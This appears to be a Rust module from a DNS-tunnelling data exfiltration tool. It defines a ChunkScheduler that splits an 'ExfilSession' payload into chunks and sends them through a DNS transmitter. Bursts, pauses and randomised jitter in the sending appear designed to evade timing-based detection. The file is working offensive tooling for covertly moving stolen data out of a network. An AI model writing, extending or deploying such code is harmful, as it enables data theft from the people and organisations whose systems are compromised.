use crate::config::Config;
use crate::dns::DnsTransmitter;
use crate::metadata::ExfilSession;
use anyhow::Result;
use rand::Rng;
use std::thread;
use std::time::Duration;

pub struct ChunkScheduler {
    cfg: Config,
}

impl ChunkScheduler {
    pub fn new(cfg: Config) -> Self {
        Self { cfg }
    }

    pub fn run(&self, session: &mut ExfilSession, transmitter: &mut DnsTransmitter) -> Result<()> {
        transmitter.send_header(session)?;
        transmitter.send_metadata_chunk(session)?;

        let mut chunks_in_burst = 0usize;
        while session.next_chunk < session.job.total_chunks {
            let index = session.next_chunk;
            let (start, end) = session.chunk_range(index);
            let chunk = &session.job.data[start..end];

            transmitter.send_chunk(session, index, chunk)?;
            session.next_chunk += 1;
            chunks_in_burst += 1;

            if session.next_chunk >= session.job.total_chunks {
                break;
            }

            if chunks_in_burst >= self.cfg.chunks_per_burst {
                chunks_in_burst = 0;
                self.sleep_with_jitter(self.cfg.burst_pause_ms);
            } else {
                self.sleep_with_jitter(0);
            }
        }

        transmitter.send_completion(session)?;
        Ok(())
    }

    fn sleep_with_jitter(&self, base_ms: u64) {
        let mut rng = rand::thread_rng();
        let jitter = if self.cfg.jitter_max_ms > self.cfg.jitter_min_ms {
            rng.gen_range(self.cfg.jitter_min_ms..=self.cfg.jitter_max_ms)
        } else {
            self.cfg.jitter_min_ms
        };
        let total = base_ms + jitter;
        if total > 0 {
            thread::sleep(Duration::from_millis(total));
        }
    }
}
